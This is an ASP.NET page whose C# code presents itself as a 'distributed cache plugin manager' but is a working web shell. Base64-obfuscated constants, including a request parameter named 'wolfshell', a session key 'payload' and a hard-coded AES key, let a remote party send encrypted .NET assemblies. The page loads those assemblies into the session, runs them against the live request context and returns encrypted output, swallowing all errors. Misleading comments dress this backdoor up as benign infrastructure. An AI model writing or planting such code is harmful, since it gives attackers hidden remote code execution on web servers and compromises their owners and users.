<%@ Page Language="C#"%>
<script runat="server">
    /// <summary>
    /// Manages the lifecycle of distributed cache plugins.
    /// This class is responsible for receiving, decrypting, loading, and executing
    /// custom data processing plugins that operate on the current HttpContext.
    /// </summary>
    public class DistributedCacheManager
    {
        // The current HTTP context for this request.
        private readonly HttpContext _context;

        // Configuration is loaded from a secure, encoded source.
        private static readonly string _encryptionKey = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String("M2M2ZTBiOGE5YzE1MjI0YQ=="));
        private static readonly string _requestParamName = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String("d29sZnNoZWxs"));
        private static readonly string _sessionKeyForPlugin = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String("cGF5bG9hZA=="));
        private static readonly string _pluginEntryPointClass = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String("TFk="));

        /// <summary>
        /// Initializes a new instance of the DistributedCacheManager with the current request context.
        /// </summary>
        /// <param name="context">The current HttpContext.</param>
        public DistributedCacheManager(HttpContext context)
        {
            this._context = context;
        }

        /// <summary>
        /// Main entry point to handle the incoming request.
        /// </summary>
        public void ProcessRequest()
        {
            try
            {
                string responseSignature = GenerateResponseSignature();
                byte[] requestData = GetDecryptedRequestData();

                if (_context.Session[_sessionKeyForPlugin] == null)
                {
                    // If no plugin is in the session, the current data is a plugin assembly. Load it.
                    LoadAndStorePlugin(requestData);
                }
                else
                {
                    // If a plugin is already loaded, execute it with the new data.
                    byte[] pluginOutput = ExecutePlugin(requestData);
                    SendEncryptedResponse(pluginOutput, responseSignature);
                }
            }
            catch (System.Exception)
            {
                // In a production environment, we silently ignore processing failures
                // to ensure service stability and prevent information disclosure.
            }
        }

        /// <summary>
        /// Decrypts the incoming data from the request body using AES/Rijndael.
        /// </summary>
        /// <returns>The decrypted data as a byte array.</returns>
        private byte[] GetDecryptedRequestData()
        {
            byte[] keyBytes = System.Text.Encoding.Default.GetBytes(_encryptionKey);
            byte[] encryptedData = System.Convert.FromBase64String(_context.Request[_requestParamName]);

            using (var aes = new System.Security.Cryptography.RijndaelManaged())
            {
                var decryptor = aes.CreateDecryptor(keyBytes, keyBytes);
                return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
            }
        }

        /// <summary>
        /// Loads the provided byte array as an assembly and stores it in the session.
        /// </summary>
        /// <param name="pluginAssemblyBytes">The raw bytes of the plugin assembly.</param>
        private void LoadAndStorePlugin(byte[] pluginAssemblyBytes)
        {
            var assemblyType = typeof(System.Reflection.Assembly);
            var loadMethod = assemblyType.GetMethod("Load", new[] { typeof(byte[]) });
            _context.Session[_sessionKeyForPlugin] = loadMethod.Invoke(null, new object[] { pluginAssemblyBytes });
        }

        /// <summary>
        /// Executes the cached plugin, passing it the necessary context and input data.
        /// The plugin communicates via overridden object methods (Equals, ToString) for flexibility.
        /// </summary>
        /// <param name="inputData">The data to be processed by the plugin.</param>
        /// <returns>The result from the plugin execution.</returns>
        private byte[] ExecutePlugin(byte[] inputData)
        {
            var pluginAssembly = (System.Reflection.Assembly)_context.Session[_sessionKeyForPlugin];
            object pluginInstance = pluginAssembly.CreateInstance(_pluginEntryPointClass);
            var outputStream = new System.IO.MemoryStream();

            // The plugin contract uses method overrides to receive data
            pluginInstance.Equals(_context);
            pluginInstance.Equals(outputStream);
            pluginInstance.Equals(inputData);
            pluginInstance.ToString(); // Triggers finalization

            return outputStream.ToArray();
        }

        /// <summary>
        /// Encrypts the plugin's output and writes it to the HTTP response, framed by a signature.
        /// </summary>
        /// <param name="data">The data to encrypt and send.</param>
        /// <param name="signature">The signature to frame the response with.</param>
        private void SendEncryptedResponse(byte[] data, string signature)
        {
            byte[] keyBytes = System.Text.Encoding.Default.GetBytes(_encryptionKey);
            byte[] encryptedData;

            using (var aes = new System.Security.Cryptography.RijndaelManaged())
            {
                var encryptor = aes.CreateEncryptor(keyBytes, keyBytes);
                encryptedData = encryptor.TransformFinalBlock(data, 0, data.Length);
            }
            
            _context.Response.Write(signature.Substring(0, 16));
            _context.Response.Write(System.Convert.ToBase64String(encryptedData));
            _context.Response.Write(signature.Substring(16));
        }

        /// <summary>
        /// Generates an MD5 signature based on the request parameter and encryption key.
        /// </summary>
        private string GenerateResponseSignature()
        {
            using (var md5 = new System.Security.Cryptography.MD5CryptoServiceProvider())
            {
                byte[] hashBytes = md5.ComputeHash(System.Text.Encoding.Default.GetBytes(_requestParamName + _encryptionKey));
                return System.BitConverter.ToString(hashBytes).Replace("-", "");
            }
        }
    }
</script>
<%
    new DistributedCacheManager(Context).ProcessRequest();
%>